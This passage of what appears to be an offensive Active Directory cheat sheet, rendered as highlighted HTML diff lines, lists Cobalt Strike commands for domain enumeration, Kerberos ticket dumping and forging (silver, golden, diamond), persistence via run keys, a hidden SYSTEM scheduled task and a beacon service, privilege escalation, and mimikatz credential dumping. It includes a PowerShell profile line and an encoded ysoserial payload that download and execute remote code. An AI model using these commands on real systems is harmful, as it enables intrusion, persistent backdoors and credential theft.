+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">objectClass</span><span class="o">=</span><span class="n">trustedDomain</span><span class="p">)</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="nx">trustPartner</span><span class="p">,</span><span class="nx">trustDirection</span><span class="p">,</span><span class="nx">trustAttributes</span><span class="p">,</span><span class="nx">flatName</span><span class="w"> </span><span class="nt">--hostname</span><span class="w"> </span><span class="nx">lon-dc-1.contoso.com</span><span class="w"> </span><span class="nt">--dn</span><span class="w"> </span><span class="nx">DC</span><span class="o">=</span><span class="n">contoso</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">com</span><span class="w">
+</span><span class="c">## Trust Account</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306370</span><span class="p">)</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="n">samAccountName</span><span class="w">
+</span><span class="c">## domain SID</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">objectClass</span><span class="o">=</span><span class="n">domain</span><span class="p">)</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="nx">objectSid</span><span class="w"> </span><span class="nt">--hostname</span><span class="w"> </span><span class="nx">lon-dc-1.contoso.com</span><span class="w"> </span><span class="nt">--dn</span><span class="w"> </span><span class="nx">DC</span><span class="o">=</span><span class="n">contoso</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">com</span><span class="w">
+</span><span class="c">## Foreign Security Principals Container</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">objectClass</span><span class="o">=</span><span class="n">foreignSecurityPrincipal</span><span class="p">)</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="nx">cn</span><span class="p">,</span><span class="nx">memberOf</span><span class="w"> </span><span class="nt">--hostname</span><span class="w"> </span><span class="nx">partner.com</span><span class="w"> </span><span class="nt">--dn</span><span class="w"> </span><span class="nx">DC</span><span class="o">=</span><span class="n">partner</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">com</span><span class="w">
+</span><span class="c">## Object ID</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">objectClass</span><span class="o">=</span><span class="n">trustedDomain</span><span class="p">)</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">objectGUID</span><span class="w">
+
+</span><span class="c"># Delegation</span><span class="w">
+</span><span class="c">## Unconstrained Delegation</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306369</span><span class="p">)(</span><span class="n">userAccountControl:1.2.840.113556.1.4.803:</span><span class="o">=</span><span class="mi">524288</span><span class="p">))</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="n">samaccountname</span><span class="w">
+</span><span class="c">## Constrained Delegation</span><span class="w">
+</span><span class="c">### for Protocol Transaition -&gt; Returned_Value == (TRUSTED_TO_AUTH_FOR_DELEGATION + Other_Flags) == [System.Convert]::ToBoolean(Returned_Value -band 16777216) == TRUE or FALSE</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306369</span><span class="p">)(</span><span class="n">msDS-AllowedToDelegateTo</span><span class="o">=*</span><span class="p">))</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="n">samAccountName</span><span class="p">,</span><span class="nx">msDS-AllowedToDelegateTo</span><span class="p">,</span><span class="nx">userAccountControl</span><span class="w">
+</span><span class="c"># RBCD</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">msDS-AllowedToActOnBehalfOfOtherIdentity</span><span class="o">=*</span><span class="p">)</span><span class="w">
+</span></pre></table></code></div></div><h3 id="bofhound"><strong>BOFHound</strong></h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre><span class="c"># OPSEC Safe Massive Enumeration</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="o">|</span><span class="p">(</span><span class="n">objectClass</span><span class="o">=</span><span class="n">domain</span><span class="p">)(</span><span class="n">objectClass</span><span class="o">=</span><span class="n">computer</span><span class="p">)(</span><span class="n">objectClass</span><span class="o">=</span><span class="n">organizationalUnit</span><span class="p">)(</span><span class="n">objectClass</span><span class="o">=</span><span class="n">groupPolicyContainer</span><span class="p">))</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="nx">ntsecuritydescriptor</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="o">|</span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306368</span><span class="p">)(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306369</span><span class="p">)(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">268435456</span><span class="p">))</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="n">ntsecuritydescriptor</span><span class="w">
+</span><span class="c">## Parse the raw cobalt strike logs and convert them to json file to work with bloodhound</span><span class="w">
+</span><span class="n">scp</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="nx">attacker</span><span class="err">@</span><span class="nx">10.0.0.5:/opt/cobaltstrike/logs</span><span class="w"> </span><span class="o">.</span><span class="w">
+</span><span class="n">bofhound</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">logs/</span><span class="w">
+
+</span><span class="c"># Restricted Group Data - Local Group Memberships</span><span class="w">
+</span><span class="n">ls</span><span class="w"> </span><span class="nx">\\contoso.com\SysVol\contoso.com\Policies\</span><span class="p">{</span><span class="mi">2583</span><span class="n">E34A-BBCE-4061-9972-E2ADAB399BB4</span><span class="p">}</span><span class="n">\Machine\Microsoft\Windows</span><span class="w"> </span><span class="nx">NT\SecEdit\</span><span class="w">
+</span><span class="n">download</span><span class="w"> </span><span class="nx">\\contoso.com\SysVol\contoso.com\Policies\</span><span class="p">{</span><span class="mi">2583</span><span class="n">E34A-BBCE-4061-9972-E2ADAB399BB4</span><span class="p">}</span><span class="n">\Machine\Microsoft\Windows</span><span class="w"> </span><span class="nx">NT\SecEdit\GptTmpl.inf</span><span class="w">
+</span><span class="c">## Apply the discovered GPOs on bloodhound</span><span class="w">
+</span><span class="n">MATCH</span><span class="w"> </span><span class="p">(</span><span class="n">x:Computer</span><span class="p">{</span><span class="n">objectid:</span><span class="s1">'S-1-5-21-3926355307-1661546229-813047887-2101'</span><span class="p">})</span><span class="w">
+</span><span class="n">MATCH</span><span class="w"> </span><span class="p">(</span><span class="n">y:Group</span><span class="p">{</span><span class="n">objectid:</span><span class="s1">'S-1-5-21-3926355307-1661546229-813047887-1106'</span><span class="p">})</span><span class="w">
+</span><span class="n">MERGE</span><span class="w"> </span><span class="p">(</span><span class="n">y</span><span class="p">)</span><span class="n">-</span><span class="p">[:</span><span class="n">AdminTo</span><span class="p">]</span><span class="o">-</span><span class="err">&gt;</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="w">
+
+</span><span class="n">MATCH</span><span class="w"> </span><span class="p">(</span><span class="n">x:Computer</span><span class="p">{</span><span class="n">objectid:</span><span class="s1">'S-1-5-21-3926355307-1661546229-813047887-2102'</span><span class="p">})</span><span class="w">
+</span><span class="n">MATCH</span><span class="w"> </span><span class="p">(</span><span class="n">y:Group</span><span class="p">{</span><span class="n">objectid:</span><span class="s1">'S-1-5-21-3926355307-1661546229-813047887-1106'</span><span class="p">})</span><span class="w">
+</span><span class="n">MERGE</span><span class="w"> </span><span class="p">(</span><span class="n">y</span><span class="p">)</span><span class="n">-</span><span class="p">[:</span><span class="n">AdminTo</span><span class="p">]</span><span class="o">-</span><span class="err">&gt;</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="w">
+
+</span><span class="c"># WMI Filters</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">objectClass</span><span class="o">=</span><span class="n">groupPolicyContainer</span><span class="p">)</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="nx">displayname</span><span class="p">,</span><span class="nx">gPCWQLFilter</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">objectClass</span><span class="o">=</span><span class="n">msWMI-Som</span><span class="p">)</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">msWMI-Name</span><span class="p">,</span><span class="nx">msWMI-Parm2</span><span class="w"> </span><span class="nt">--dn</span><span class="w"> </span><span class="s2">"CN=SOM,CN=WMIPolicy,CN=System,DC=contoso,DC=com"</span><span class="w">
+</span></pre></table></code></div></div><h3 id="powerviewad-module"><strong>PowerView/AD Module</strong></h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="c"># To be able to use the PowerView and AD module safely, we need to use them on our attacking machine; hence, we need creds/ticket</span><span class="w">
+</span><span class="c">## Using Kerbeus-BOF</span><span class="w">
+</span><span class="c">### Dump user TGT</span><span class="w">
+</span><span class="n">krb_triage</span><span class="w">
+</span><span class="nx">krb_dump</span><span class="w"> </span><span class="nx">/user:rsteel</span><span class="w"> </span><span class="nx">/luid:26b420</span><span class="w"> </span><span class="nx">/service:krbtgt</span><span class="w">
+</span><span class="c">### Create socks proxy</span><span class="w">
+</span><span class="n">socks</span><span class="w"> </span><span class="nx">1080</span><span class="w"> </span><span class="nx">socks5</span><span class="w">
+</span><span class="c">### Setup Proxy on the attacking Machine using Proxfiier</span><span class="w">
+</span><span class="c">### Configure DNS settings in the hosts file</span><span class="w">
+</span><span class="n">Add-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Windows\System32\drivers\etc\hosts</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="s2">"10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"</span><span class="w">
+</span><span class="c">### Get a TGS for the LDAP service using the dumped TGT ticket</span><span class="w">
+</span><span class="n">runas</span><span class="w"> </span><span class="nx">/netonly</span><span class="w"> </span><span class="nx">/user:CONTOSO\rsteel</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w">
+</span><span class="n">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/service:ldap/lon-dc-1</span><span class="w"> </span><span class="nx">/ticket:do..</span><span class="w"> </span><span class="nx">/dc:lon-dc-1</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
+</span><span class="n">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">klist</span><span class="w">
+</span><span class="c">### Start Enumeration</span><span class="w">
+</span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">lon-dc-1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">name</span><span class="w">
+</span></pre></table></code></div></div><h2 id="persistence"><strong>Persistence</strong></h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+</pre><td class="rouge-code"><pre><span class="c"># Registry Run Keys</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps</span><span class="w">
+</span><span class="n">upload</span><span class="w"> </span><span class="nx">C:\Payloads\http_x64.exe</span><span class="w">
+</span><span class="n">mv</span><span class="w"> </span><span class="nx">http_x64.exe</span><span class="w"> </span><span class="nx">updater.exe</span><span class="w">
+</span><span class="n">reg_set</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">Software\Microsoft\Windows\CurrentVersion\Run</span><span class="w"> </span><span class="nx">Updater</span><span class="w"> </span><span class="nx">REG_EXPAND_SZ</span><span class="w"> </span><span class="o">%</span><span class="nx">LOCALAPPDATA</span><span class="o">%</span><span class="nx">\Microsoft\WindowsApps\updater.exe</span><span class="w">
+</span><span class="n">reg_query</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">Software\Microsoft\Windows\CurrentVersion\Run</span><span class="w"> </span><span class="nx">Updater</span><span class="w">
+
+</span><span class="c"># Startup Folder</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start</span><span class="w"> </span><span class="nx">Menu\Programs\Startup</span><span class="w">
+</span><span class="n">upload</span><span class="w"> </span><span class="nx">C:\Payloads\http_x64.exe</span><span class="w">
+</span><span class="n">mv</span><span class="w"> </span><span class="nx">http_x64.exe</span><span class="w"> </span><span class="nx">updater.exe</span><span class="w">
+
+</span><span class="c"># Logon Script - execute automatically when the user logs in</span><span class="w">
+</span><span class="n">reg_set</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">Environment</span><span class="w"> </span><span class="nx">UserInitMprLogonScript</span><span class="w"> </span><span class="nx">REG_EXPAND_SZ</span><span class="w"> </span><span class="o">%</span><span class="nx">USERPROFILE</span><span class="o">%</span><span class="nx">\AppData\Local\Microsoft\WindowsApps\updater.exe</span><span class="w">
+
+</span><span class="c"># PowerShell Profile - executes when new PowerShell windows are opened by a user</span><span class="w">
+</span><span class="n">mkdir</span><span class="w"> </span><span class="nx">C:\Users\pchilds\Documents\WindowsPowerShell</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Users\pchilds\Documents\WindowsPowerShell</span><span class="w">
+</span><span class="c">## Add this line to profile.ps1 file</span><span class="w">
+</span><span class="bp">$_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Start-Job</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s2">"http://bleepincomputer.com/a"</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span><span class="n">upload</span><span class="w"> </span><span class="nx">C:\Payloads\Profile.ps1</span><span class="w">
+
+</span><span class="c"># Scheduled Task</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\Microsoft</span><span class="w"> </span><span class="nx">Update</span><span class="w"> </span><span class="nx">Health</span><span class="w"> </span><span class="nx">Tools</span><span class="w">
+</span><span class="n">upload</span><span class="w"> </span><span class="nx">C:\Payloads\dns_x64.exe</span><span class="w">
+</span><span class="n">schtaskscreate</span><span class="w"> </span><span class="nx">\Microsoft\Windows\WindowsUpdate\Updater</span><span class="w"> </span><span class="nx">XML</span><span class="w"> </span><span class="nx">CREATE</span><span class="w">
+</span><span class="c">## task get triggered when device get restared</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">Task</span><span class="w"> </span><span class="nx">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/windows/2004/02/mit/task"</span><span class="err">&gt;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">Triggers</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="n">BootTrigger</span><span class="err">&gt;</span><span class="w">
+        </span><span class="err">&lt;</span><span class="n">Enabled</span><span class="err">&gt;</span><span class="nx">true</span><span class="err">&lt;</span><span class="nx">/Enabled</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="n">/BootTrigger</span><span class="err">&gt;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">/Triggers</span><span class="err">&gt;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">Principals</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="n">Principal</span><span class="err">&gt;</span><span class="w">
+        </span><span class="err">&lt;</span><span class="n">UserId</span><span class="err">&gt;</span><span class="nx">NT</span><span class="w"> </span><span class="nx">AUTHORITY\SYSTEM</span><span class="err">&lt;</span><span class="nx">/UserId</span><span class="err">&gt;</span><span class="w">
+        </span><span class="err">&lt;</span><span class="n">RunLevel</span><span class="err">&gt;</span><span class="nx">HighestAvailable</span><span class="err">&lt;</span><span class="nx">/RunLevel</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="n">/Principal</span><span class="err">&gt;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">/Principals</span><span class="err">&gt;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">Settings</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="n">AllowStartOnDemand</span><span class="err">&gt;</span><span class="nx">true</span><span class="err">&lt;</span><span class="nx">/AllowStartOnDemand</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="n">Enabled</span><span class="err">&gt;</span><span class="nx">true</span><span class="err">&lt;</span><span class="nx">/Enabled</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="kr">Hidden</span><span class="err">&gt;</span><span class="n">true</span><span class="err">&lt;</span><span class="nx">/Hidden</span><span class="err">&gt;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">/Settings</span><span class="err">&gt;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">Actions</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="n">Exec</span><span class="err">&gt;</span><span class="w">
+        </span><span class="err">&lt;</span><span class="kr">Command</span><span class="err">&gt;</span><span class="s2">"C:\Program Files\Microsoft Update Health Tools\updater.exe"</span><span class="err">&lt;</span><span class="n">/Command</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="n">/Exec</span><span class="err">&gt;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">/Actions</span><span class="err">&gt;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">/Task</span><span class="err">&gt;</span><span class="w">
+
+</span><span class="c"># Service - executed on system start-up</span><span class="w">
+</span><span class="n">upload</span><span class="w"> </span><span class="nx">C:\Payloads\beacon_x64.svc.exe</span><span class="w">
+</span><span class="n">mv</span><span class="w"> </span><span class="nx">beacon_x64.svc.exe</span><span class="w"> </span><span class="nx">debug_svc.exe</span><span class="w">
+</span><span class="n">sc_create</span><span class="w"> </span><span class="nx">dbgsvc</span><span class="w"> </span><span class="s2">"Debug Service"</span><span class="w"> </span><span class="nx">C:\Windows\System32\debug_svc.exe</span><span class="w"> </span><span class="s2">"Windows Debug Service"</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="nx">3</span><span class="w">
+
+</span><span class="c"># Silver Tickets - Machine and Service accounts</span><span class="w">
+</span><span class="n">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">silver</span><span class="w"> </span><span class="nx">/service:cifs/lon-db-1</span><span class="w"> </span><span class="nx">/aes256:machine_account_kerberos_key</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/domain:CONTOSO.COM</span><span class="w"> </span><span class="nx">/sid:S-1-5-21-3926355307-1661546229-813047887</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="n">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">silver</span><span class="w"> </span><span class="nx">/service:MSSQLSvc/lon-db-1.contoso.com:1433</span><span class="w"> </span><span class="nx">/rc4:service_accout_hash</span><span class="w"> </span><span class="nx">/user:rsteel</span><span class="w"> </span><span class="nx">/id:1108</span><span class="w"> </span><span class="nx">/groups:513</span><span class="p">,</span><span class="nx">1106</span><span class="p">,</span><span class="nx">1107</span><span class="p">,</span><span class="nx">4602</span><span class="w"> </span><span class="nx">/domain:CONTOSO.COM</span><span class="w"> </span><span class="nx">/sid:S-1-5-21-3926355307-1661546229-813047887</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+
+</span><span class="c"># Golden Ticket</span><span class="w">
+</span><span class="n">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">golden</span><span class="w"> </span><span class="nx">/aes256:krbtgt_key</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/domain:CONTOSO.COM</span><span class="w"> </span><span class="nx">/sid:S-1-5-21-3926355307-1661546229-813047887</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="n">make_token</span><span class="w"> </span><span class="nx">CONTOSO\Administrator</span><span class="w"> </span><span class="nx">FakePass</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:doIFg</span><span class="w">
+
+</span><span class="c"># Diamond Ticket</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">diamond</span><span class="w"> </span><span class="nx">/tgtdeleg</span><span class="w"> </span><span class="nx">/krbkey:krbtgt_key</span><span class="w"> </span><span class="nx">/ticketuser:Administrator</span><span class="w"> </span><span class="nx">/ticketuserid:500</span><span class="w"> </span><span class="nx">/domain:CONTOSO.COM</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="n">make_token</span><span class="w"> </span><span class="nx">CONTOSO\Administrator</span><span class="w"> </span><span class="nx">FakePass</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:doIFg</span><span class="w">
+</span></pre></table></code></div></div><h2 id="privesc"><strong>PrivEsc</strong></h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre><td class="rouge-code"><pre><span class="c"># Path Interception</span>
+<span class="c">## PATH Environment Variable</span>
+<span class="nb">env
+</span>cacls C:<span class="se">\P</span>ython313<span class="se">\S</span>cripts<span class="se">\</span>
+	NT AUTHORITY<span class="se">\A</span>uthenticated Users:<span class="o">(</span>CI<span class="o">)(</span>OI<span class="o">)(</span>IO<span class="o">)</span>
+upload C:<span class="se">\P</span>ayloads<span class="se">\d</span>ns_x64.exe
+<span class="c">## Search Order Hijacking</span>
+<span class="c">## Unquoted Paths</span>
+sc_enum
+cacls <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\B</span><span class="s2">ad Windows Service"</span>
+<span class="nb">cd </span>C:<span class="se">\P</span>rogram Files<span class="se">\B</span>ad Windows Service
+upload C:<span class="se">\P</span>ayloads<span class="se">\d</span>ns_x64.svc.exe
+<span class="nb">mv </span>dns_x64.svc.exe Service.exe
+
+<span class="c"># Weak Service Permissions</span>
+<span class="c">## Service File Permissions - Full Control over service file</span>
+cacls <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\B</span><span class="s2">ad Windows Service</span><span class="se">\S</span><span class="s2">ervice Executable</span><span class="se">\B</span><span class="s2">adWindowsService.exe"</span>
+<span class="nb">cd </span>C:<span class="se">\P</span>rogram Files<span class="se">\B</span>ad Windows Service<span class="se">\S</span>ervice Executable<span class="se">\</span>
+sc_stop BadWindowsService
+upload C:<span class="se">\P</span>ayloads<span class="se">\B</span>adWindowsService.exe
+sc_start BadWindowsService
+<span class="c">## Service Registry Permissions - Change Binary Path</span>
+powerpick Get-Acl <span class="nt">-Path</span> HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices<span class="se">\B</span>adWindowsService | fl
+sc_stop BadWindowsService
+sc_config BadWindowsService C:<span class="se">\P</span>ath<span class="se">\t</span>o<span class="se">\P</span>ayload.exe 0 2
+sc_start BadWindowsService
+
+<span class="c"># Software Vulnerabilities</span>
+<span class="c">## Loading binary file from an untrusted location, and uses a BinaryFormatter to deserialise the data</span>
+C:<span class="se">\T</span>ools<span class="se">\y</span>soserial.net<span class="se">\y</span>soserial<span class="se">\b</span><span class="k">in</span><span class="se">\R</span>elease<span class="se">\y</span>soserial.exe <span class="nt">-g</span> TypeConfuseDelegate <span class="nt">-f</span> BinaryFormatter <span class="nt">-c</span> <span class="s2">"powershell -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAzADEANAA5ADAALwAnACkA"</span> <span class="nt">-o</span> raw <span class="nt">--outputpath</span><span class="o">=</span>C:<span class="se">\P</span>ayloads<span class="se">\d</span>ata.bin
+<span class="nb">cd </span>C:<span class="se">\T</span>emp
+upload C:<span class="se">\P</span>ayloads<span class="se">\d</span>ata.bin
+
+<span class="c"># UAC</span>
+elevate <span class="o">[</span>exploit] <span class="o">[</span>listener]
+runasadmin <span class="o">[</span>exploit] <span class="o">[</span><span class="nb">command</span><span class="o">]</span> <span class="o">[</span>args]
+</pre></table></code></div></div><h2 id="credential-harvesting"><strong>Credential Harvesting</strong></h2><h3 id="os-credential-dumping"><strong>OS Credential Dumping</strong></h3><h4 id="lsass-memory"><strong>LSASS Memory</strong></h4><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre><span class="c"># NTLM Hashes</span>
+mimikatz sekurlsa::logonpasswords
+
+<span class="c"># Protected LSASS</span>
+mimikatz <span class="o">!</span>+
+<span class="o">!</span>processprotect /process:lsass.exe /remove
+sekurlsa::logonpasswords
+
+<span class="c"># Kerberos Keys</span>
+mimikatz sekurlsa::ekeys
+
+<span class="c"># Security Account Manager</span>
+<span class="c">## Copying the SAM and SYSTEM file from the Shadow Volume</span>
+copy <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy1<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>onfig<span class="se">\s</span>am C:<span class="se">\u</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\s</span>am
+copy <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy1<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>onfig<span class="se">\s</span>ystem C:<span class="se">\u</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\s</span>ystem        
+<span class="c">## Save SAM and SYSTEM files from the registry</span>
+reg save HKLM<span class="se">\s</span>am C:<span class="se">\u</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\s</span>am-reg
+reg save HKLM<span class="se">\s</span>ystem C:<span class="se">\u</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\s</span>ystem-reg
+
+<span class="c"># LSA Secrets</span>
+mimikatz lsadump::secrets
+mimikatz <span class="o">!</span>lsadump::secrets
+
+<span class="c"># Cached Domain Credentials</span>
+mimikatz lsadump::cache
+mimikatz <span class="o">!</span>lsadump::cache
+</pre></table></code></div></div><h4 id="ntds-domain-controller"><strong>NTDS Domain Controller</strong></h4><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
